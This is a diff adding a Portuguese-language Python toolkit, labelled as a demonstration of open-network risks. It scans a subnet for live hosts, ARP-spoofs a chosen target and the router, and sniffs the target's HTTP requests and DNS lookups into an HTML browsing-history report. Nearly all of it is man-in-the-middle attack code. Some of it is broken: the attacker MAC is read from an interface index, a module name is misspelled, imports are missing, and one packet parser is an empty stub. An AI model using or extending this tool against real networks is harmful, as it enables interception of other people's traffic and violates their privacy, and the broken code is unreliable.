@@ -1,0 +1,491 @@
+---
+active_hosts.py
+import argparse
+import socket
+import struct
+import time
+import subprocess
+
+# Configuração de argumentos de linha de comando
+parser = argparse.ArgumentParser(description="Varredura de hosts ativos na rede.")
+parser.add_argument("rede", help="Endereço da rede (ex: 192.168.15.0)")
+parser.add_argument("mascara", type=int, help="Máscara de rede (ex: 24)")
+parser.add_argument("timeout", type=int, help="Tempo limite para resposta (em ms)")
+args = parser.parse_args()
+
+# Função para calcular checksum para pacotes ICMP
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        word = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
+        s += word
+        s = (s & 0xffff) + (s >> 16)
+    return ~s & 0xffff
+
+# Função para enviar e receber ICMP Echo Request/Reply
+def icmp_ping(dest_addr, timeout):
+    try:
+        icmp_proto = socket.getprotobyname("icmp")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_proto)
+        sock.settimeout(timeout / 1000)  # Converte ms para segundos
+
+        icmp_type = 8  # ICMP Echo Request
+        code = 0 # Código padrão do ICMP
+        checksum_val = 0 # Vai ser calculado na função checksum
+        identifier = 12345  # Só para identificar o pacote enviado
+        sequence = 1
+        header = struct.pack("!BBHHH", icmp_type, code, checksum_val, identifier, sequence)
+        data = b'network_scan'
+        checksum_val = checksum(header + data)
+        header = struct.pack("!BBHHH", icmp_type, code, checksum_val, identifier, sequence)
+        packet = header + data
+
+        start_time = time.time()
+        sock.sendto(packet, (dest_addr, 1))
+
+        while True:
+            try:
+                response, _ = sock.recvfrom(1024)
+                response_time = (time.time() - start_time) * 1000
+
+                # Verificar o cabeçalho ICMP da resposta
+                ip_header = response[:20]
+                icmp_header = response[20:28]
+                icmp_type, icmp_code, _, recv_id, _ = struct.unpack("!BBHHH", icmp_header)
+
+                if icmp_type == 0 and recv_id == identifier:  # Echo Reply e identificador correspondente
+                    return response_time
+            except socket.timeout:
+                return None
+    finally:
+        sock.close()
+
+# Função para converter um endereço IP para um inteiro
+def ip_to_int(ip):
+    parts = ip.split(".")
+    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
+
+# Função para converter um inteiro para um endereço IP
+def int_to_ip(ip_int):
+    return f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}"
+
+# Função para calcular o intervalo de IPs
+def calcular_intervalo_ips(rede, mascara):
+    num_hosts = (1 << (32 - mascara)) - 2 # Calculo número de hosts da rede
+    rede_int = ip_to_int(rede)
+    primeiro_ip = rede_int + 1
+    ultimo_ip = rede_int + num_hosts
+    return [int_to_ip(ip) for ip in range(primeiro_ip, ultimo_ip + 1)]
+
+# Realiza a varredura na rede
+def scan_network(rede, mascara, timeout):
+    active_hosts = []
+    hosts = calcular_intervalo_ips(rede, mascara)
+    total_hosts = len(hosts)
+
+    print(f"Varredura em andamento na rede {rede}/{mascara}...")
+    start_time = time.time()
+
+    for ip in hosts:
+        response_time = icmp_ping(ip, timeout)
+        if response_time is not None:
+            active_hosts.append((ip, response_time))
+            print(f"Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")
+
+    total_time = time.time() - start_time
+    print(f"\nNúmero de hosts ativos: {len(active_hosts)}")
+    print(f"Total de hosts na rede: {total_hosts}")
+    print(f"Tempo total de varredura: {total_time:.2f} segundos")
+    return active_hosts
+
+# Executa a varredura
+if __name__ == "__main__":
+    active_hosts = scan_network(args.rede, args.mascara, args.timeout)
+    
+    print("\nLista de hosts ativos:")
+    for host, response_time in active_hosts:
+        print(f"{host} - {response_time:.2f} ms")
+    
+    print("\n --- ATAQUE ARP SPOOFING ---")
+    arp_ataque = input("Digite: {interface} {ip_para_atacar} {ip_roteador} ex: enp4s0 10.1.1.5 10.1.1.1\n")
+
+    try:
+        interface, ip_alvo, ip_roteador = arp_ataque.split()
+        print("Iniciando ataque ARP Spoofing...")
+
+        import arp_spoofing
+        from threading import Thread
+
+        # Iniciar ataque ARP Spoofing
+        spoof_thread = Thread(target=arp_spoofing.arp_spoof, args=(interface, ip_alvo, ip_roteador))
+        spoof_thread.start()
+
+        print("\n --- INICIANDO MONITORAMENTO ---")
+        import traffic_control
+
+        # Iniciar o sniffer
+        traffic_control.sniffer(interface)
+
+    except ValueError:
+        print("Erro: entrada inválida. Use o formato: {interface} {ip_alvo} {ip_roteador}")
+---
+analise.py
+import struct
+
+# Função para extrair dados HTTP (caso o pacote seja HTTP)
+def extrair_http(pacote):
+    # Verificando se o pacote tem TCP/IP e se é HTTP
+    # A estrutura de um pacote TCP começa com 20 bytes de cabeçalho
+    if len(pacote) > 54:  # 14 bytes de Ethernet + 20 de IP + 20 de TCP
+        ip_header = pacote[14:34]  # Cabeçalho IP (IP: 14 - 34)
+        ip_src = struct.unpack("!4B", ip_header[:4])  # Endereço IP de origem
+        ip_dst = struct.unpack("!4B", ip_header[4:8])  # Endereço IP de destino
+        
+        tcp_header = pacote[34:54]  # Cabeçalho TCP (TCP: 34 - 54)
+        # Vamos verificar se a payload do TCP contém uma solicitação HTTP
+        payload = pacote[54:].decode(errors="ignore")  # Carregar a parte de dados como string
+        if "HTTP" in payload:  # Verificar se é HTTP
+            url = None
+            for line in payload.splitlines():
+                if line.startswith("GET") or line.startswith("POST"):
+                    # Extrair a URL (em um GET ou POST)
+                    url = line.split(" ")[1]
+                    break
+            return url, ip_src, ip_dst
+    return None
+
+# Função para extrair dados DNS (caso o pacote seja DNS)
+def extrair_dns(pacote):
+    # Verificando se o pacote é DNS
+    if len(pacote) > 42:  # Cabeçalho Ethernet (14 bytes) + IP (20 bytes) + UDP (8 bytes)
+        udp_header = pacote[34:42]  # Cabeçalho UDP (UDP: 34 - 42)
+        # DNS começa após 8 bytes de cabeçalho UDP
+        dns_data = pacote[42:]
+        # DNS normalmente começa com um ID seguido por flags e uma seção de perguntas
+        # Aqui vamos extrair o nome de domínio solicitado (domínio está no começo da seção de perguntas)
+        
+        try:
+            nome_dominio = None
+            offset = 0
+            while offset < len(dns_data):
+                # O primeiro byte indica o comprimento do domínio
+                length = dns_data[offset]
+                if length == 0:  # Fim do nome de domínio
+                    break
+                nome_dominio = dns_data[offset + 1: offset + 1 + length].decode()
+                offset += length + 1
+            if nome_dominio:
+                return nome_dominio
+        except Exception as e:
+            pass
+    return None
+---
+arp_spoofing.py
+import socket
+import struct
+import time
+import threading
+
+def criar_pacote_arp(src_mac, src_ip, dst_mac, dst_ip, opcode):
+    """Cria um pacote ARP Ethernet com o opcode especificado."""
+    eth_header = struct.pack(
+        "!6s6sH",
+        bytes.fromhex(dst_mac.replace(":", "")),  # MAC de destino
+        bytes.fromhex(src_mac.replace(":", "")),  # MAC de origem
+        0x0806,  # Tipo EtherType ARP
+    )
+    arp_header = struct.pack(
+        "!HHBBH6s4s6s4s",
+        1,  # Tipo de hardware (Ethernet)
+        0x0800,  # Protocolo (IPv4)
+        6,  # Tamanho do endereço MAC
+        4,  # Tamanho do endereço IP
+        opcode,  # Opcode (1 para request, 2 para reply)
+        bytes.fromhex(src_mac.replace(":", "")),  # MAC do remetente
+        socket.inet_aton(src_ip),  # IP do remetente
+        bytes.fromhex(dst_mac.replace(":", "")),  # MAC do destino
+        socket.inet_aton(dst_ip),  # IP do destino
+    )
+    return eth_header + arp_header
+
+def obter_mac(interface, ip):
+    """Obtém o endereço MAC para um IP usando uma solicitação ARP."""
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    s.bind((interface, 0))
+    arp_request = criar_pacote_arp(
+        src_mac="ff:ff:ff:ff:ff:ff", src_ip="0.0.0.0", dst_mac="ff:ff:ff:ff:ff:ff", dst_ip=ip, opcode=1
+    )
+    s.send(arp_request)
+
+    while True:
+        packet = s.recvfrom(65536)[0]
+        eth_type = struct.unpack("!H", packet[12:14])[0]
+        if eth_type == 0x0806:  # ARP
+            arp_data = packet[14:28]
+            _, _, _, _, mac, ip_resp = struct.unpack("!HHBBH6s4s", arp_data)
+            if socket.inet_ntoa(ip_resp) == ip:
+                return ":".join("{:02x}".format(b) for b in mac)
+
+def arp_spoof(interface, alvo_ip, roteador_ip):
+    """Executa ARP Spoofing entre o alvo e o roteador."""
+    alvo_mac = obter_mac(interface, alvo_ip)
+    roteador_mac = obter_mac(interface, roteador_ip)
+
+    atacante_mac = socket.if_nametoindex(interface)
+    print("[INFO] Iniciando ARP Spoofing...")
+
+    pacote_para_alvo = criar_pacote_arp(atacante_mac, roteador_ip, alvo_mac, alvo_ip, 2)
+    pacote_para_roteador = criar_pacote_arp(atacante_mac, alvo_ip, roteador_mac, roteador_ip, 2)
+
+    try:
+        while True:
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+            s.bind((interface, 0))
+            s.send(pacote_para_alvo)
+            s.send(pacote_para_roteador)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac)
+
+def restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac):
+    """Restaura as tabelas ARP ao estado original."""
+    atacante_mac = socket.if_nametoindex(interface)
+    pacote_para_alvo = criar_pacote_arp(roteador_mac, roteador_ip, alvo_mac, alvo_ip, 2)
+    pacote_para_roteador = criar_pacote_arp(alvo_mac, alvo_ip, roteador_mac, roteador_ip, 2)
+
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    s.bind((interface, 0))
+    for _ in range(5):
+        s.send(pacote_para_alvo)
+        s.send(pacote_para_roteador)
+        time.sleep(1)
+
+    print("[INFO] Tabelas ARP restauradas.")
+---
+arospoof.py
+import os
+import subprocess
+
+def habilitar_ip_forwarding():
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write("1")
+
+def executar_arpspoof(interface, alvo, roteador):
+    try:
+        while True:
+            subprocess.run(["arpspoof", "-i", interface, "-t", alvo, roteador], check=True)
+            subprocess.run(["arpspoof", "-i", interface, "-t", roteador, alvo], check=True)
+    except KeyboardInterrupt:
+        print("\nARP Spoofing interrompido pelo usuário.")
+---
+icmp.py
+import socket
+import struct
+import time
+
+def criar_pacote_icmp():
+    header = struct.pack("bbHHh", 8, 0, 0, 0, 0)
+    checksum = calcular_checksum(header)
+    return struct.pack("bbHHh", 8, 0, checksum, 0, 0)
+
+def calcular_checksum(header):
+    if len(header) % 2:
+        header += b'\x00'
+    checksum = sum(struct.unpack("!%dH" % (len(header) // 2), header))
+    checksum = (checksum >> 16) + (checksum & 0xFFFF)
+    checksum += checksum >> 16
+    return ~checksum & 0xFFFF
+
+def enviar_ping(host, timeout):
+    try:
+        icmp = socket.getprotobyname("icmp")
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp) as sock:
+            sock.settimeout(timeout / 1000)
+            packet = criar_pacote_icmp()
+            sock.sendto(packet, (host, 1))
+            start = time.time()
+            sock.recvfrom(1024)
+            return int((time.time() - start) * 1000)  # Retorna tempo em ms
+    except socket.timeout:
+        return None
+---
+main.py
+import sys
+from varredura import executar_varredura
+from arpspoof import habilitar_ip_forwarding, executar_arpspoof
+from sniffer import iniciar_sniffer
+from relatorio import gerar_relatorio_html
+
+def menu():
+    print("\n=== Ferramenta de Demonstração de Riscos em Redes Abertas ===")
+    print("1. Descobrir Hosts Ativos (Etapa 1)")
+    print("2. Realizar ARP Spoofing (Etapa 2)")
+    print("3. Monitorar Tráfego de Rede (Etapa 3)")
+    print("4. Sair")
+    return input("Escolha uma opção: ")
+
+def etapa1():
+    rede = input("Digite a rede (ex.: 192.168.1.128/25): ")
+    timeout = int(input("Digite o tempo limite de resposta (ms): "))
+    hosts_ativos = executar_varredura(rede, timeout)
+    print("\nHosts Ativos:")
+    for host, tempo in hosts_ativos:
+        print(f"IP: {host}, Tempo de Resposta: {tempo}ms")
+
+def etapa2():
+    habilitar_ip_forwarding()
+    interface = input("Digite a interface de rede (ex.: eth0): ")
+    alvo = input("Digite o IP do alvo: ")
+    roteador = input("Digite o IP do roteador: ")
+    executar_arpspoof(interface, alvo, roteador)
+
+def etapa3():
+    interface = input("Digite a interface de rede para monitorar (ex.: eth0): ")
+    historico = iniciar_sniffer(interface)
+    gerar_relatorio_html(historico)
+
+if __name__ == "__main__":
+    while True:
+        escolha = menu()
+        if escolha == "1":
+            etapa1()
+        elif escolha == "2":
+            etapa2()
+        elif escolha == "3":
+            etapa3()
+        elif escolha == "4":
+            sys.exit()
+        else:
+            print("Opção inválida.")
+---
+relatorio.py
+from datetime import datetime
+
+def gerar_relatorio_html(historico):
+    with open("historico_navegacao.html", "w") as f:
+        f.write("<html><head><title>Histórico de Navegação</title></head><body>")
+        f.write(f"<h1>Histórico de Navegação - Gerado em {datetime.now()}</h1>")
+        f.write("<table border='1'><tr><th>Data e Hora</th><th>IP do Host</th><th>URL</th></tr>")
+        for entrada in historico:
+            f.write(f"<tr><td>{entrada['data_hora']}</td><td>{entrada['ip']}</td><td>{entrada['url']}</td></tr>")
+        f.write("</table></body></html>")
+---
+sniffer.py
+import socket
+import struct
+from datetime import datetime
+
+def iniciar_sniffer(interface):
+    try:
+        raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+        raw_socket.bind((interface, 0))
+        historico = []
+        print("Sniffer iniciado... Pressione Ctrl+C para parar.")
+        while True:
+            pacote = raw_socket.recvfrom(65565)[0]
+            historico.extend(analise_pacote(pacote))
+    except KeyboardInterrupt:
+        print("\nSniffer finalizado.")
+    return historico
+
+def analise_pacote(pacote):
+    # Análise de cabeçalhos Ethernet, IPv4, TCP/UDP, HTTP e DNS
+    # Retorna uma lista de entradas para o histórico.
+    # (Deixe vazio para implementação futura)
+    return []
+---
+traffic_control.py
+def sniffer(interface):
+    """Captura pacotes de rede e processa DNS e HTTP."""
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+    s.bind((interface, 0))
+    print("[INFO] Iniciando sniffer... Pressione Ctrl+C para parar.")
+
+    try:
+        while True:
+            packet = s.recvfrom(65535)[0]
+            processar_pacote(packet)
+    except KeyboardInterrupt:
+        print("[INFO] Sniffer finalizado.")
+
+def processar_pacote(packet):
+    """Processa pacotes Ethernet, IP e TCP/UDP."""
+    eth_header = packet[:14]
+    eth_data = struct.unpack("!6s6sH", eth_header)
+
+    if eth_data[2] == 0x0800:  # IPv4
+        ip_header = packet[14:34]
+        ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
+
+        protocolo = ip_data[6]
+        src_ip = socket.inet_ntoa(ip_data[8])
+        dst_ip = socket.inet_ntoa(ip_data[9])
+
+        if protocolo == 6:  # TCP
+            processar_tcp(packet[34:], src_ip, dst_ip)
+        elif protocolo == 17:  # UDP
+            processar_udp(packet[34:], src_ip, dst_ip)
+
+def processar_tcp(data, src_ip, dst_ip):
+    """Captura pacotes HTTP."""
+    src_port, dst_port, _, _, offset_flags = struct.unpack("!HHLLH", data[:14])
+    offset = (offset_flags >> 12) * 4
+    payload = data[offset:]
+
+    if dst_port == 80 or src_port == 80:  # HTTP
+        try:
+            http_data = payload.decode("utf-8", errors="ignore")
+            if "GET" in http_data or "POST" in http_data:
+                print(f"[HTTP] {src_ip} -> {dst_ip}")
+                print(http_data.split("\r\n")[0])  # Primeira linha da requisição
+        except Exception:
+            pass
+
+def processar_udp(data, src_ip, dst_ip):
+    """Captura pacotes DNS."""
+    src_port, dst_port, length, checksum = struct.unpack("!HHHH", data[:8])
+    payload = data[8:]
+
+    if dst_port == 53 or src_port == 53:  # DNS
+        try:
+            query_name = extract_dns_query(payload)
+            print(f"[DNS] {src_ip} -> {dst_ip}: {query_name}")
+        except Exception:
+            pass
+
+def extract_dns_query(payload):
+    """Extrai o nome da consulta DNS."""
+    query = []
+    i = 12  # Pula o cabeçalho DNS
+    while payload[i] != 0:
+        length = payload[i]
+        i += 1
+        query.append(payload[i:i+length].decode())
+        i += length
+    return ".".join(query)
+
+def salvar_historico(arquivo, historico):
+    # Salva o histórico de navegação em HTML
+    with open(arquivo, "w") as f:
+        f.write("<html><header><title>Histórico</title></header><body><ul>")
+        for item in historico:
+            f.write(f"<li>{item}</li>")
+        f.write("</ul></body></html>")
+---
+varredura.py
+import ipaddress
+from icmp import enviar_ping
+
+def executar_varredura(rede, timeout):
+    hosts_ativos = []
+    rede = ipaddress.ip_network(rede, strict=False)
+    for host in rede.hosts():
+        tempo_resposta = enviar_ping(str(host), timeout)
+        if tempo_resposta is not None:
+            hosts_ativos.append((str(host), tempo_resposta))
+    return hosts_ativos
+---
+
+
+
+
